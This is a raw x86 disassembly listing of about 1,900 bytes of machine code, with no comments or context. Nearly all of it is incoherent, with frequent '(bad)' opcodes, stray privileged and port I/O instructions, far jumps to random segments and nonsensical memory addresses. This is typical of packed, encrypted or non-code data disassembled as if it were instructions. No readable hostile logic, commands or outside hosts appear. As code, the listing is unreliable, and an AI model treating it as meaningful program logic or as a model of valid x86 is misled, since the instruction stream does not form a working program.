  41fe52:	mov    BYTE PTR ds:0xb79e8074,cl
  41fe58:	mov    ah,0xf
  41fe5a:	xchg   ebx,eax
  41fe5b:	cdq    
  41fe5c:	or     eax,0x6e41a4c9
  41fe61:	pop    edi
  41fe62:	mov    ch,0xf8
  41fe64:	jae    0x41fe41
  41fe66:	cs dec edx
  41fe68:	cmp    edi,ecx
  41fe6a:	sub    edi,DWORD PTR [esi*8-0x3cf78bef]
  41fe71:	push   ecx
  41fe72:	or     edi,DWORD PTR [ebx+ebx*4]
  41fe75:	xor    BYTE PTR [ebp+0x7b1c15d4],bh
  41fe7b:	enter  0xde14,0x65
  41fe7f:	gs cmp eax,0x16c14fb3
  41fe85:	lea    ecx,[esi+0x64cd9c10]
  41fe8b:	icebp  
  41fe8c:	jp     0x41fec3
  41fe8e:	test   DWORD PTR [eax+0x1b],0xc1749650
  41fe95:	retf   
  41fe96:	jns    0x41fe2c
  41fe98:	push   ebx
  41fe99:	lahf   
  41fe9a:	mov    esi,0x8ff24f2b
  41fe9f:	(bad)  
  41fea0:	inc    DWORD PTR [edx]
  41fea2:	mov    ds:0xc3de1c6d,eax
  41fea7:	jns    0x41fe52
  41fea9:	lahf   
  41feaa:	outs   dx,DWORD PTR ds:[esi]
  41feab:	arpl   WORD PTR [edi+0x29],sp
  41feae:	nop
  41feaf:	enter  0x4b87,0x5d
  41feb3:	shl    DWORD PTR [ecx-0x44],0x95
  41feb7:	test   DWORD PTR [esi+0x750290a8],edi
  41febd:	jmp    0xd68f:0xf0d0d41e
  41fec4:	pop    esi
  41fec5:	xor    al,0x2c
  41fec7:	and    BYTE PTR [ebp+0x5235ef8e],bl
  41fecd:	fmulp  st(7),st
  41fecf:	mov    ds:0x373bd25d,eax
  41fed4:	pop    es
  41fed5:	rcl    DWORD PTR [eax-0x58726b6c],1
  41fedb:	and    DWORD PTR ds:[esi-0x1e96c244],edx
  41fee2:	lea    ecx,[edx]
  41fee4:	arpl   di,ax
  41fee6:	sbb    DWORD PTR [edi-0x4fc482ad],edi
  41feec:	fwait
  41feed:	in     eax,0x90
  41feef:	mov    edx,0xa37c3a66
  41fef4:	push   esp
  41fef5:	fmulp  st(6),st
  41fef7:	test   BYTE PTR [edx-0x39],0x6b
  41fefb:	hlt    
  41fefc:	and    al,0x3
  41fefe:	nop
  41feff:	pop    es
  41ff00:	stos   DWORD PTR es:[edi],eax
  41ff01:	push   eax
  41ff02:	ins    DWORD PTR es:[edi],dx
  41ff03:	mov    al,ds:0x4a260898
  41ff08:	xor    bl,cl
  41ff0a:	idiv   BYTE PTR [esi+0x6accfa4f]
  41ff10:	fwait
  41ff11:	stos   BYTE PTR es:[edi],al
  41ff12:	rcr    BYTE PTR [ecx+0x6d],1
  41ff15:	daa    
  41ff16:	popa   
  41ff17:	pop    ebp
  41ff18:	sbb    BYTE PTR [ebx],0xf2
  41ff1b:	sbb    BYTE PTR [ebx],0x58
  41ff1e:	ss jg  0x41feeb
  41ff21:	push   0xf59b976b
  41ff26:	and    al,0x5
  41ff28:	stc    
  41ff29:	inc    esp
  41ff2a:	call   0x1a1feb06
  41ff2f:	dec    esp
  41ff30:	ins    DWORD PTR es:[edi],dx
  41ff31:	out    0xb9,al
  41ff33:	in     al,0xea
  41ff35:	rcl    BYTE PTR [eax-0x6e6ec857],1
  41ff3b:	in     eax,dx
  41ff3c:	dec    ecx
  41ff3d:	cmp    ebx,DWORD PTR [ecx+0x600b094a]
  41ff43:	xlat   BYTE PTR ds:[ebx]
  41ff44:	push   ds
  41ff45:	into   
  41ff46:	xor    DWORD PTR [esi],esi
  41ff48:	pop    ebx
  41ff49:	pushf  
  41ff4a:	nop
  41ff4b:	jmp    0x41ffc6
  41ff4d:	icebp  
  41ff4e:	adc    edi,DWORD PTR [esi+0x5]
  41ff51:	push   esi
  41ff52:	pushf  
  41ff53:	dec    ecx
  41ff54:	pop    ebp
  41ff55:	pop    ecx
  41ff56:	mov    bh,0xd2
  41ff58:	fmul   DWORD PTR [eax]
  41ff5a:	in     al,dx
  41ff5b:	loopne 0x41fef8
  41ff5d:	inc    ebx
  41ff5e:	mov    dl,0x4e
  41ff60:	retf   
  41ff61:	popa   
  41ff62:	jmp    0x18d02fac
  41ff67:	dec    edx
  41ff68:	dec    esp
  41ff69:	inc    ecx
  41ff6a:	(bad)  
  41ff6b:	rep lods al,BYTE PTR ds:[esi]
  41ff6d:	std    
  41ff6e:	stc    
  41ff6f:	fcomp  QWORD PTR [ebx+0x35757843]
  41ff75:	xchg   ebx,eax
  41ff76:	imul   ecx,DWORD PTR [ebp-0x47],0xffffffdd
  41ff7a:	inc    ebp
  41ff7b:	test   al,0xc
  41ff7d:	adc    al,0xea
  41ff7f:	(bad)
  41ff84:	mov    ebx,eax
  41ff86:	adc    dl,ah
  41ff88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff89:	aad    0xbc
  41ff8b:	pop    ebp
  41ff8c:	dec    ebp
  41ff8d:	fisub  WORD PTR [esi]
  41ff8f:	jo     0x41ff42
  41ff91:	xchg   edx,eax
  41ff92:	cmc    
  41ff93:	sbb    DWORD PTR [edi+ebx*4-0x6a],ecx
  41ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff98:	jg     0x41ffbc
  41ff9a:	test   dh,ch
  41ff9c:	iret   
  41ff9d:	cli    
  41ff9e:	fldcw  WORD PTR [ebx]
  41ffa0:	push   edi
  41ffa1:	sahf   
  41ffa2:	clc    
  41ffa3:	test   al,0xc8
  41ffa5:	lahf   
  41ffa6:	(bad)  
  41ffa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffa8:	fwait
  41ffa9:	mov    dh,cl
  41ffab:	cwde   
  41ffac:	pop    ss
  41ffad:	dec    edx
  41ffae:	je     0x41ffbd
  41ffb0:	mov    esp,0x2ca47dd
  41ffb5:	jbe    0x41ff8c
  41ffb7:	adc    edx,DWORD PTR [ebx]
  41ffb9:	repz xchg ebx,eax
  41ffbb:	loop   0x41ffd3
  41ffbd:	fstp   st(6)
  41ffbf:	cmp    eax,0xca93a41b
  41ffc4:	rcr    ebp,cl
  41ffc6:	sbb    BYTE PTR [ebp-0x49],ah
  41ffc9:	or     DWORD PTR [ebp-0x6f733c3d],edi
  41ffcf:	mov    al,ds:0xbc3840d7
  41ffd4:	mov    esi,DWORD PTR [ecx-0x8ccb5f4]
  41ffda:	push   0x8b79c68d
  41ffdf:	fstp   DWORD PTR [ebx-0x9110b84]
  41ffe5:	mov    WORD PTR [edi],?
  41ffe7:	es enter 0xbbe2,0x6c
  41ffec:	fsubr  QWORD PTR [eax+0x40]
  41ffef:	retf   0x9aea
  41fff2:	test   cl,ah
  41fff4:	fwait
  41fff5:	jmp    0x420076
  41fff7:	rcl    BYTE PTR [eax+ecx*8-0x1e],cl
  41fffb:	stos   DWORD PTR es:[edi],eax
  41fffc:	mov    WORD PTR [edx],gs
  41fffe:	retf   
  41ffff:	clc    
  420000:	aam    0xb6
  420002:	pop    ds
  420003:	mov    ah,0x72
  420005:	xor    dh,BYTE PTR [eax]
  420007:	xlat   BYTE PTR ds:[ebx]
  420008:	(bad)  
  420009:	fcom   st(6)
  42000b:	(bad)  
  42000c:	mov    ds:0x5c379f2a,al
  420011:	ficom  DWORD PTR [ebx-0x14998c0d]
  420017:	add    ch,BYTE PTR [edi]
  420019:	ficom  WORD PTR [ebx-0x17fe0395]
  42001f:	add    DWORD PTR [eax+eiz*2],esi
  420022:	nop
  420023:	sbb    edi,DWORD PTR [edx-0x1b]
  420026:	lea    eax,[eax]
  420028:	fmul   QWORD PTR [ebp-0x16]
  42002b:	dec    edx
  42002c:	ret    
  42002d:	(bad)  
  42002e:	out    0x37,al
  420030:	sub    BYTE PTR [ebx+ebp*4+0x69],bl
  420034:	jnp    0x420045
  420036:	nop
  420037:	std    
  420038:	div    DWORD PTR ds:0x74da6309
  42003e:	std    
  42003f:	dec    ecx
  420040:	fcmovne st,st(6)
  420042:	(bad)  
  420043:	leave  
  420044:	into   
  420045:	push   edx
  420046:	aas    
  420047:	pusha  
  420048:	test   eax,0x143e4005
  42004d:	loope  0x4200c7
  42004f:	inc    ecx
  420050:	cmp    DWORD PTR [esi-0x224cca90],ebp
  420056:	push   cs
  420057:	and    BYTE PTR [esi-0x65],al
  42005a:	aad    0x3a
  42005c:	push   edx
  42005d:	pusha  
  42005e:	lods   al,BYTE PTR ds:[esi]
  42005f:	and    edi,eax
  420061:	xchg   ebx,eax
  420062:	push   eax
  420063:	mov    al,ds:0x32aec009
  420068:	test   al,0xe0
  42006a:	push   esi
  42006b:	jg     0x420046
  42006d:	sub    edi,DWORD PTR [edx+0x78]
  420070:	xchg   ebx,eax
  420071:	pop    es
  420072:	sub    al,0x4c
  420074:	adc    ecx,edx
  420076:	nop
  420077:	ret    
  420078:	mov    esi,0x6cfcdd72
  42007d:	es ret 
  42007f:	dec    ecx
  420080:	pusha  
  420081:	(bad)
  420084:	dec    ecx
  420085:	call   0x6252:0x21c19500
  42008c:	fwait
  42008d:	in     eax,dx
  42008e:	popf   
  42008f:	hlt    
  420090:	xchg   edi,eax
  420091:	pop    eax
  420092:	sub    eax,0x3d30674a
  420097:	xor    BYTE PTR [edi],bh
  420099:	call   0x1bd5185c
  42009e:	xchg   ebx,eax
  42009f:	jmp    0x420089
  4200a1:	mov    esi,0x82181eec
  4200a6:	push   eax
  4200a7:	in     al,0x31
  4200a9:	loop   0x4200a5
  4200ab:	dec    ecx
  4200ac:	sti    
  4200ad:	push   ebp
  4200ae:	jle    0x4200ed
  4200b0:	retf   0x3352
  4200b3:	xchg   ecx,eax
  4200b4:	fwait
  4200b5:	fwait
  4200b6:	inc    eax
  4200b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200b8:	cli    
  4200b9:	mov    ch,0x1e
  4200bb:	mov    dl,0xbd
  4200bd:	push   esi
  4200be:	dec    edi
  4200bf:	push   0xa2f4f96
  4200c4:	sbb    ebp,ebp
  4200c6:	ins    DWORD PTR es:[edi],dx
  4200c7:	(bad)  
  4200c8:	imul   edi,DWORD PTR [edx-0x262e6870],0x6a8911b
  4200d2:	pusha  
  4200d3:	dec    edx
  4200d4:	inc    edx
  4200d5:	sahf   
  4200d6:	cld    
  4200d7:	pmaxub mm5,mm7
  4200da:	(bad)  
  4200dc:	scas   eax,DWORD PTR es:[edi]
  4200dd:	iret   
  4200de:	lahf   
  4200df:	addr16 push edi
  4200e1:	fidivr WORD PTR [edi-0x19]
  4200e4:	mov    esi,0x6d556bf6
  4200e9:	(bad)  
  4200eb:	xchg   esp,eax
  4200ec:	jae    0x42011e
  4200ee:	pop    esp
  4200ef:	mov    ch,0x48
  4200f1:	adc    DWORD PTR [edi+0x4a2e9ca0],0xa2f9cb09
  4200fb:	arpl   WORD PTR [esp+ebp*8+0x224ba783],dx
  420102:	push   ecx
  420103:	loopne 0x4200f3
  420105:	adc    edx,edx
  420107:	xor    eax,0x89907721
  42010c:	(bad)  
  42010d:	mov    ds:0xa02d239d,eax
  420112:	mov    edx,0xb1f74450
  420117:	push   DWORD PTR [ecx+0x6e]
  42011a:	outs   dx,DWORD PTR ds:[esi]
  42011b:	or     eax,0xaa93cb13
  420120:	xor    DWORD PTR [ebx],0xfffffff5
  420123:	into   
  420124:	loop   0x4200c3
  420126:	fwait
  420127:	mov    cl,0x64
  420129:	push   es
  42012a:	dec    esp
  42012b:	leave  
  42012c:	pop    esi
  42012d:	fisubr WORD PTR [esi-0xbdcb364]
  420133:	in     al,dx
  420134:	jge    0x420198
  420136:	nop
  420137:	sbb    al,0xce
  420139:	es shr eax,cl
  42013c:	xchg   esp,eax
  42013d:	lock retf 
  42013f:	dec    ecx
  420140:	lods   al,BYTE PTR ds:[esi]
  420141:	fidiv  DWORD PTR [edx]
  420143:	ret    
  420144:	mov    dh,0xfb
  420146:	dec    eax
  420147:	sti    
  420148:	fwait
  420149:	scas   al,BYTE PTR es:[edi]
  42014a:	xchg   ebp,eax
  42014b:	xchg   bh,cl
  42014d:	jmp    0x420132
  42014f:	inc    esp
  420150:	stos   BYTE PTR es:[edi],al
  420151:	in     al,0xb8
  420153:	retf   
  420154:	inc    esi
  420155:	pop    edx
  420156:	inc    ebx
  420157:	dec    eax
  420158:	pop    ebx
  420159:	fs hlt 
  42015b:	rcr    DWORD PTR [edx-0x13615a1e],cl
  420161:	and    al,0x90
  420163:	popf   
  420164:	inc    cx
  420166:	lods   eax,DWORD PTR ds:[esi]
  420167:	or     bh,BYTE PTR [esi-0x17]
  42016a:	mov    ecx,0x108f74da
  42016f:	adc    al,ah
  420171:	neg    cl
  420173:	std    
  420174:	mov    bh,0x7b
  420176:	and    eax,0x2389bb6
  42017b:	mov    ecx,0x33bd79fe
  420180:	sub    al,0x18
  420182:	loope  0x420180
  420184:	cmp    ah,BYTE PTR ds:0x408a17a4
  42018a:	cmp    ecx,DWORD PTR [ebx-0x65]
  42018d:	adc    BYTE PTR [esi-0x18],0xfa
  420191:	mov    dl,BYTE PTR [eax+0x4befac8d]
  420197:	cwde   
  420198:	out    dx,al
  420199:	cmp    DWORD PTR [edi],ebx
  42019b:	push   ebx
  42019c:	lock xchg ecx,eax
  42019e:	scas   eax,DWORD PTR es:[edi]
  42019f:	mov    ebp,0x542d771b
  4201a4:	int3   
  4201a5:	(bad)  
  4201a6:	nop
  4201a7:	test   eax,0xc1ff209a
  4201ac:	pop    ecx
  4201ad:	jge    0x420203
  4201af:	dec    edx
  4201b0:	add    ch,BYTE PTR [eax]
  4201b2:	pop    edx
  4201b3:	adc    dh,cl
  4201b5:	imul   ecx,DWORD PTR [eax+0x56],0xffffff9b
  4201b9:	and    ebx,0xffffffdd
  4201bc:	and    ebp,esp
  4201be:	jae    0x4201c1
  4201c0:	push   es
  4201c1:	fisub  WORD PTR [ebp-0x35]
  4201c4:	(bad)  
  4201c5:	sbb    BYTE PTR [edi],al
  4201c7:	mov    edx,DWORD PTR [ebx+0x35]
  4201ca:	nop
  4201cb:	xor    DWORD PTR [eax],esi
  4201cd:	in     al,0xe8
  4201cf:	sbb    bh,ah
  4201d1:	mov    bh,0xa3
  4201d3:	dec    ecx
  4201d4:	mov    edx,0x613842fa
  4201d9:	hlt    
  4201da:	mul    BYTE PTR [eax]
  4201dc:	fwait
  4201dd:	cmp    bl,BYTE PTR [edx-0x2d]
  4201e0:	cdq    
  4201e1:	xchg   BYTE PTR [ebx],cl
  4201e3:	hlt    
  4201e4:	sbb    al,0xdf
  4201e6:	mov    ebp,0xfd662be5
  4201eb:	jns    0x420253
  4201ed:	mov    dh,0xa4
  4201ef:	pop    edx
  4201f0:	fwait
  4201f1:	sub    eax,0x12ba5430
  4201f6:	arpl   WORD PTR [eax],sp
  4201f8:	mov    esi,ds
  4201fa:	xlat   BYTE PTR ds:[ebx]
  4201fb:	sub    DWORD PTR [edx-0x1e7c4600],ecx
  420201:	out    0xab,al
  420203:	xor    DWORD PTR [ebp+0x6fcd92fa],0x68e9f1a5
  42020d:	mov    dl,BYTE PTR [ecx+0x6b65aa49]
  420213:	pop    esp
  420214:	pop    edi
  420215:	mov    eax,edi
  420217:	out    0xa9,al
  420219:	jl     0x42028f
  42021b:	cmp    al,0xa
  42021d:	pop    esi
  42021e:	and    ah,cl
  420220:	scas   eax,DWORD PTR es:[edi]
  420221:	mov    ebx,0xcb24a33
  420226:	repz jmp 0x902d37f9
  42022c:	cmp    DWORD PTR [eax-0x70],0x7a6b671f
  420233:	xchg   edi,eax
  420234:	add    eax,0x7849b28c
  420239:	push   edi
  42023a:	addr16 pop ds
  42023c:	dec    edx
  42023d:	lahf   
  42023e:	add    DWORD PTR [edi-0x65],edx
  420241:	ja     0x4201fd
  420243:	retf   0xd1f5
  420246:	inc    edi
  420247:	lds    esp,FWORD PTR [edx+0x19]
  42024a:	inc    esi
  42024b:	cld    
  42024c:	fld    DWORD PTR [ebx-0x3350698e]
  420253:	mov    WORD PTR [ebx-0x18c0aea5],ds
  420259:	cmp    eax,0xecd3cbfc
  42025e:	pop    edi
  42025f:	mov    bh,0x97
  420261:	sub    BYTE PTR [esi],ch
  420263:	retf   0x25b4
  420266:	leave  
  420267:	ins    BYTE PTR es:[edi],dx
  420268:	xchg   esi,eax
  420269:	mov    gs,WORD PTR [eax+edi*1-0x552fa068]
  420270:	loop   0x420223
  420272:	add    BYTE PTR [eax*1+0x67906ced],ch
  420279:	pop    ecx
  42027a:	xor    DWORD PTR [ecx-0x37],ebx
  42027d:	test   DWORD PTR [ebx],edx
  42027f:	cmp    dl,BYTE PTR [ecx-0x58]
  420282:	nop
  420283:	add    BYTE PTR [edi],dh
  420285:	push   cs
  420286:	addr16 cwde 
  420288:	jle    0x420240
  42028a:	dec    edi
  42028b:	push   ecx
  42028c:	adc    BYTE PTR ds:0x3f122918,al
  420292:	ret    0xa8da
  420295:	(bad)
  420298:	fwait
  420299:	(bad)  
  42029a:	stc    
  42029b:	mov    bl,ch
  42029d:	sbb    BYTE PTR [ebp-0x5b],ch
  4202a0:	push   ebp
  4202a1:	fidivr WORD PTR [ecx+0x13]
  4202a4:	shl    DWORD PTR [esp+ecx*4-0x684cff97],0xf
  4202ac:	xor    eax,0x5e4427a0
  4202b1:	es test ch,ch
  4202b4:	mov    eax,ds:0x6ed049cd
  4202b9:	fisttp WORD PTR [esi]
  4202bb:	daa    
  4202bc:	bound  edi,QWORD PTR [ebx+0x38]
  4202bf:	inc    ebx
  4202c0:	sti    
  4202c1:	popf   
  4202c2:	add    edi,esp
  4202c4:	fwait
  4202c5:	sti    
  4202c6:	or     BYTE PTR [edx],ah
  4202c8:	lods   al,BYTE PTR ds:[esi]
  4202c9:	vmwrite edi,DWORD PTR [edi-0x7f]
  4202cd:	ficom  WORD PTR [esi]
  4202cf:	fstp   QWORD PTR [edx+0x1269d84f]
  4202d5:	seto   BYTE PTR [esi+eax*8]
  4202d9:	or     eax,0x8311b0f
  4202de:	stos   BYTE PTR es:[edi],al
  4202df:	dec    ecx
  4202e0:	sbb    BYTE PTR [edi-0x139ff63e],cl
  4202e6:	sub    eax,0xbde99b96
  4202eb:	cdq    
  4202ec:	mov    eax,gs:0xde2f832c
  4202f2:	aaa    
  4202f3:	or     BYTE PTR [edi+eiz*8],ch
  4202f6:	mov    cl,BYTE PTR [ebx+0x13]
  4202f9:	(bad)  
  4202fa:	iret   
  4202fb:	push   ds
  4202fc:	push   eax
  4202fd:	pop    esi
  4202fe:	mov    ebp,ebx
  420300:	mov    bl,0x8c
  420302:	xchg   DWORD PTR [ebx+0x7b],ebx
  420305:	loop   0x4202c4
  420307:	push   esp
  420308:	add    al,0x30
  42030a:	ret    
  42030b:	or     DWORD PTR [edx-0x7f],ebp
  42030e:	mov    bh,0xa2
  420310:	pushf  
  420311:	dec    ebx
  420312:	jmp    0xbb5:0x31e2dc2b
  420319:	imul   ecx,DWORD PTR cs:[esp+edx*4+0x55],0xffffff9b
  42031f:	(bad)  
  420320:	jp     0x4202bf
  420322:	lock and ah,cl
  420325:	aas    
  420326:	loopne 0x4202cf
  420328:	sbb    DWORD PTR [eax+0x5f175690],0xc2b73fb4
  420332:	je     0x42037e
  420334:	mov    dl,0xbf
  420336:	mov    ds:0x7818fa06,eax
  42033b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42033c:	fwait
  42033d:	mov    ecx,0xc85c55f7
  420342:	bound  eax,QWORD PTR [ebx+0x4456dde1]
  420348:	jnp    0x42038a
  42034a:	mov    esi,0x9095b532
  42034f:	pop    edx
  420350:	ret    0x3060
  420353:	xchg   edx,eax
  420354:	mov    BYTE PTR [esi+0x2],al
  420357:	dec    edx
  420358:	add    ch,BYTE PTR [edi-0x48]
  42035b:	push   0xffffff89
  42035d:	sbb    BYTE PTR [esi+0x64],dh
  420360:	fwait
  420361:	mov    eax,0x9eea5154
  420366:	xlat   BYTE PTR ds:[ebx]
  420367:	mov    edx,0xd9b3de72
  42036c:	cmp    bl,dl
  42036e:	mov    ds:0x9706e875,al
  420373:	xchg   DWORD PTR [ebx-0x74d1fa45],esp
  420379:	dec    esp
  42037a:	in     eax,0x1d
  42037c:	out    0xde,eax
  42037e:	cwde   
  42037f:	std    
  420380:	ins    BYTE PTR es:[edi],dx
  420381:	xor    DWORD PTR [eax*8-0x798be262],ebx
  420388:	test   al,0xeb
  42038a:	xchg   edx,eax
  42038b:	test   al,0x1a
  42038d:	popf   
  42038e:	sbb    eax,0xc675abf4
  420393:	push   esp
  420394:	sbb    ch,bh
  420396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420397:	push   ecx
  420398:	add    al,0xad
  42039a:	mov    cs,esp
  42039c:	push   ds
  42039d:	shl    ch,0x4e
  4203a0:	jae    0x4203fc
  4203a2:	lods   eax,DWORD PTR ds:[esi]
  4203a3:	gs fwait
  4203a5:	push   eax
  4203a6:	hlt    
  4203a7:	mov    bh,BYTE PTR [edx-0x26]
  4203aa:	mov    dl,0xf1
  4203ac:	call   0xa89a7b09
  4203b1:	repnz adc bh,ch
  4203b4:	pop    ebx
  4203b5:	(bad)  
  4203b6:	loopne 0x4203ea
  4203b8:	xor    edx,DWORD PTR [edx]
  4203ba:	lods   al,BYTE PTR ds:[esi]
  4203bb:	add    eax,0x958fe571
  4203c0:	and    al,BYTE PTR [ebx-0x6d]
  4203c3:	lock dec esp
  4203c5:	fsubrp st(0),st
  4203c7:	jmp    0x819b283a
  4203cc:	dec    edi
  4203cd:	sbb    BYTE PTR [eax+0x6cf4cef6],dl
  4203d3:	outs   dx,DWORD PTR ds:[esi]
  4203d4:	stc    
  4203d5:	fiadd  WORD PTR [esi+0x59]
  4203d8:	dec    esi
  4203d9:	mov    edx,0x371b445f
  4203de:	and    BYTE PTR [esi+0x3c],bl
  4203e1:	push   ebp
  4203e2:	lahf   
  4203e3:	sub    ebp,DWORD PTR [edx-0x28d5abf8]
  4203e9:	and    al,0xd4
  4203eb:	test   al,0xca
  4203ed:	in     al,0xb1
  4203ef:	ficomp DWORD PTR ds:0x6daa2e3c
  4203f5:	jmp    0xc1c8:0x6c871a0e
  4203fc:	push   eax
  4203fd:	ins    BYTE PTR es:[edi],dx
  4203fe:	mov    ch,0x46
  420400:	dec    edi
  420401:	fmulp  st(1),st
  420403:	cld    
  420404:	mov    dl,0xfd
  420406:	pop    esi
  420407:	push   ebx
  420408:	and    DWORD PTR [ebx+edx*4-0x23],edx
  42040c:	sahf   
  42040d:	es xchg dh,al
  420410:	sbb    DWORD PTR ds:0x577bd95c,0xffffff90
  420417:	inc    edi
  420418:	mov    ds:0xb5ab70df,al
  42041d:	push   ecx
  42041e:	imul   ecx,DWORD PTR [edx+0x73],0xd2a64ab8
  420425:	and    ah,BYTE PTR [ebx-0x4b746425]
  42042b:	fist   WORD PTR [esi]
  42042d:	mov    ch,0xb2
  42042f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420430:	dec    esp
  420431:	loopne 0x4203f1
  420433:	xchg   esi,eax
  420434:	aaa    
  420435:	in     eax,dx
  420436:	fnstcw WORD PTR [ebp-0xe]
  420439:	popf   
  42043a:	ins    DWORD PTR es:[edi],dx
  42043b:	push   ss
  42043c:	(bad)  
  42043d:	frstor [eax]
  42043f:	jne    0x42045b
  420441:	inc    edi
  420442:	jns    0x420445
  420444:	je     0x42042a
  420446:	push   es
  420447:	jmp    0x420401
  420449:	imul   esp,DWORD PTR [eax-0x27caa417],0x28
  420450:	mov    ch,0xca
  420452:	ret    0x9c49
  420455:	add    al,0xb0
  420457:	rcr    BYTE PTR [edi-0x64ceb16d],cl
  42045d:	stc    
  42045e:	lods   eax,DWORD PTR ds:[esi]
  42045f:	mov    cl,0x7c
  420461:	xor    BYTE PTR [eax+ecx*4+0x2f],0xde
  420466:	jne    0x4203fc
  420468:	test   BYTE PTR [edx],dl
  42046a:	addr16 call 0xe2fe:0x80afa691
  420472:	pcmpgtb mm2,mm5
  420475:	adc    DWORD PTR [esi],0x96de565a
  42047b:	mov    ds:0x1d3d9075,eax
  420480:	clc    
  420481:	or     dl,BYTE PTR [eax-0xf952384]
  420487:	jecxz  0x4204ab
  420489:	sub    al,0x89
  42048b:	pop    esi
  42048c:	jg     0x420441
  42048e:	pop    edi
  42048f:	repnz sahf 
  420491:	jle    0x4204fa
  420493:	in     al,dx
  420494:	clc    
  420495:	or     eax,0x77a38d40
  42049a:	nop
  42049b:	into   
  42049c:	add    al,0x8d
  42049e:	neg    BYTE PTR [edx+0x4a3aeb23]
  4204a4:	mov    ch,0x6c
  4204a6:	cmc    
  4204a7:	jg     0x4204a2
  4204a9:	aaa    
  4204aa:	out    0x27,eax
  4204ac:	fwait
  4204ad:	loope  0x4204d1
  4204af:	mov    ecx,0x40481d8f
  4204b4:	imul   ebx,esi,0xffffffbf
  4204b7:	mov    ch,0x48
  4204b9:	mov    eax,ds:0xb3dd623a
  4204be:	nop
  4204bf:	aad    0xc5
  4204c1:	push   eax
  4204c2:	es jmp 0x4ec0f554
  4204c8:	call   0x92dda93
  4204cd:	pop    esi
  4204ce:	jae    0x42046e
  4204d0:	push   ebp
  4204d1:	mov    ebp,0x63451d97
  4204d6:	sar    BYTE PTR [edi*2-0x45764937],0xa3
  4204de:	mov    esi,0x5ba58d49
  4204e3:	imul   BYTE PTR [ecx]
  4204e5:	jg     0x420479
  4204e7:	stc    
  4204e8:	(bad)  
  4204e9:	push   ss
  4204ea:	sahf   
  4204eb:	xor    bh,BYTE PTR [esi]
  4204ed:	and    ch,BYTE PTR [esi]
  4204ef:	stos   BYTE PTR es:[edi],al
  4204f0:	mov    ebx,ds
  4204f2:	out    dx,eax
  4204f3:	inc    esp
  4204f4:	sbb    al,0xdf
  4204f6:	pop    ds
  4204f7:	pop    ds
  4204f8:	fucomp st(7)
  4204fa:	dec    ecx
  4204fb:	repz jnp 0x4204d8
  4204fe:	(bad)  
  4204ff:	loopne 0x42049c
  420501:	mov    esi,0x1eb9de4c
  420506:	stc    
  420507:	sub    ebp,DWORD PTR [ebx]
  420509:	ror    BYTE PTR [ebx+0x4a],cl
  42050c:	sub    al,BYTE PTR [ecx+0x1b]
  42050f:	add    al,0x43
  420511:	loopne 0x420557
  420513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420514:	mov    ds:0x9c0196ee,al
  420519:	sahf   
  42051a:	pop    ss
  42051b:	inc    ebp
  42051c:	sti    
  42051d:	cmc    
  42051e:	sbb    ecx,DWORD PTR [eax+0x382dde15]
  420524:	sub    DWORD PTR [eax+0x470768ca],0xffffff97
  42052b:	mov    WORD PTR [ebp+0x40],cs
  42052e:	sub    bl,bl
  420530:	sbb    esi,edi
  420532:	pop    esp
  420533:	test   al,0x6f
  420535:	xchg   esi,eax
  420536:	mov    al,ds:0xa54dc349
  42053b:	inc    edi
  42053c:	adc    esi,DWORD PTR [ebp-0x7]
  42053f:	test   DWORD PTR [edx-0x64170a18],esi
  420545:	push   eax
  420546:	push   eax
  420547:	dec    esp
  420548:	rol    DWORD PTR [eax],cl
  42054a:	stos   BYTE PTR es:[edi],al
  42054b:	dec    ecx
  42054c:	out    0x96,al
  42054e:	js     0x42058f
  420550:	rol    DWORD PTR [edi-0x29],0xa2
  420554:	fwait
  420555:	push   0x90abc1fe
  42055a:	fidiv  WORD PTR [eax]
  42055c:	adc    dl,dh
  42055e:	xor    BYTE PTR [edx],ch
  420560:	mov    esp,0x3eb023f4
  420565:	loope  0x420578
  420567:	int3   
  420568:	test   DWORD PTR [edi+0x20],esp
  42056b:	xchg   BYTE PTR ds:[edi],dh
  42056e:	nop
  42056f:	ret    0xa8dd
  420572:	in     eax,0x5c
  420574:	popa   
  420575:	xchg   BYTE PTR [ecx-0x7b],ch
  420578:	dec    edi
  420579:	sahf   
  42057a:	nop
  42057b:	push   esi
  42057c:	shr    DWORD PTR [ecx-0x141c55da],cl
  420582:	(bad)  
  420583:	(bad)  [esp+edx*8+0x107465e0]
  42058a:	cwde   
  42058b:	inc    sp
  42058d:	inc    esp
  42058e:	mov    al,0x8c
  420590:	sbb    DWORD PTR [esi],eax
  420592:	sub    BYTE PTR [eax],dh
  420594:	sub    ebp,DWORD PTR [ecx]
  420596:	pop    esp
  420597:	adc    dh,BYTE PTR [edx-0x61aa4d68]
  42059d:	mov    cl,0xd
  42059f:	pop    edx
  4205a0:	mov    ah,0x9d
  4205a2:	arpl   WORD PTR [ecx+0x28],bp
  4205a5:	cli    
  4205a6:	repz push esp
  4205a8:	int    0xdf
  4205aa:	or     eax,0x5039ce78
  4205af:	leave  
  4205b0:	adc    al,0x54
  4205b2:	in     al,dx
  4205b3:	push   esi
  4205b4:	lods   eax,DWORD PTR ds:[esi]
  4205b5:	fst    QWORD PTR [ecx+0x2a]
  4205b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205b9:	xchg   edi,eax
  4205ba:	test   BYTE PTR [edx+0x1c],bh
  4205bd:	fiadd  WORD PTR [eax-0x4eb20638]
  4205c3:	xor    esi,eax
  4205c5:	inc    ebx
  4205c6:	nop
  4205c7:	stos   DWORD PTR es:[edi],eax
  4205c8:	gs mov esi,0xae76732a
  4205ce:	jmp    0xbafe6d1c
  4205d3:	cmc    
  4205d4:	push   ds
  4205d5:	push   ebp
  4205d6:	mov    ah,0x10
  4205d8:	fwait
  4205d9:	push   0x1
  4205db:	(bad)  
  4205dc:	mov    dh,0x8e
  4205de:	imul   ebx,DWORD PTR [ebx+0x4221de2f],0x4fcb8d07
  4205e8:	push   esi
  4205e9:	pop    es
  4205ea:	nop
  4205eb:	push   di
  4205ed:	test   eax,0x89805cb4
  4205f2:	repnz dec ecx
  4205f4:	or     eax,0x9ab78294
  4205f9:	jge    0x420626
